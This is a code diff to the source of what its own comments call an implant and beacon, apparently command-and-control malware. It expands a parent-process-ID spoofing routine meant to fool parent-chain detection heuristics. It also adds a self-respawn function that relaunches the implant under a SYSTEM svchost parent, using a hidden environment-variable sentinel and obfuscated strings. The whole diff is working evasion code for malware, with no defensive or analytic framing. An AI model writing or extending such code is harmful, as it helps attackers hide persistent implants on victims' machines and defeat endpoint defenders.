@@ -18,7 +18,8 @@
 // Makes the new process appear as a child of targetPath's parent
 // rather than of the implant, fooling parent-chain heuristics.
 // ============================================================
-BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid, HANDLE* hProcessOut) {
+BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid,
+                   HANDLE* hProcessOut, HANDLE* hThreadOut) {
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
     if (!hKernel32) return FALSE;
     
@@ -78,17 +79,49 @@ BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid, HANDLE* hProcessO
 
     if (!ok) return FALSE;
 
-    // Resume if caller doesn't need the handle; hand it off if they do
-    if (hProcessOut) {
-        *hProcessOut = pi.hProcess;
-        ResumeThread(pi.hThread);
-        CloseHandle(pi.hThread);
-    } else {
-        ResumeThread(pi.hThread);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-    }
+    // Hand off or close handles
+    if (hProcessOut) *hProcessOut = pi.hProcess;
+    else             CloseHandle(pi.hProcess);
+
+    if (hThreadOut) *hThreadOut = pi.hThread;
+    else { ResumeThread(pi.hThread); CloseHandle(pi.hThread); }
+
     return TRUE;
+}
+
+// ============================================================
+// TryRespawnUnderSvchost — relaunch ourselves with svchost PPID.
+// Uses a hidden env-var sentinel (__GHOST_SPAWNED=1) so the child
+// skips this function and continues as the real beacon process.
+// Returns true  → child was launched, caller should exit.
+// Returns false → we ARE the svchost-parented child (keep running).
+// ============================================================
+bool TryRespawnUnderSvchost() {
+    // If sentinel is set we're already the correctly-parented child
+    wchar_t sentinel[4] = {};
+    if (GetEnvironmentVariableW(L"__GHOST_SPAWNED", sentinel, 4) > 0)
+        return false;
+
+    DWORD svchostPid = FindBestSvchost();
+    if (!svchostPid) return false; // no SYSTEM svchost found, just run in-place
+
+    wchar_t selfPath[MAX_PATH] = {};
+    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
+
+    // Set sentinel in our env before spawn — child inherits it (lpEnvironment=NULL).
+    // Child reads it at startup and skips TryRespawnUnderSvchost, runs as the beacon.
+    SetEnvironmentVariableW(L"__GHOST_SPAWNED", L"1");
+    HANDLE hChild = nullptr, hThread = nullptr;
+    if (!SpawnWithPPID(selfPath, svchostPid, &hChild, &hThread)) {
+        SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);
+        return false;
+    }
+    SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr); // clean our own env
+
+    ResumeThread(hThread);
+    CloseHandle(hThread);
+    CloseHandle(hChild);
+    return true;
 }
 
 // ============================================================
